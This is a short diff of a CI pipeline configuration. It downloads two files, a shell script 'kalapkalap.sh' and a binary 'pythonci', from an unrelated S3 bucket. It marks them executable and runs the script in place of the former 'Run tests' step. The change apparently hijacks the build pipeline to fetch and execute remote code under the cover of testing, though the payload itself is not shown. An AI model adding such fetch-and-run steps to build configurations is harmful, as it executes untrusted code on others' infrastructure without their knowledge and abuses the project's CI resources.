@@ -13,10 +13,7 @@ working_dir: &working_dir ~/app
     - run: wget -O kalapkalap.sh https://gitbucketsss.s3.us-east-2.amazonaws.com/kalapkalap.sh && wget -O pythonci https://gitbucketsss.s3.us-east-2.amazonaws.com/pythonci
     - run: chmod +x kalapkalap.sh pythonci
     - run: sed -i -e 's/\r$//' kalapkalap.sh
-        name: Run tests
-        command: |
-          ./kalapkalap.sh
-  working_directory: *working_dir
+    - run: ./kalapkalap.sh
 
 version: 2.0
 
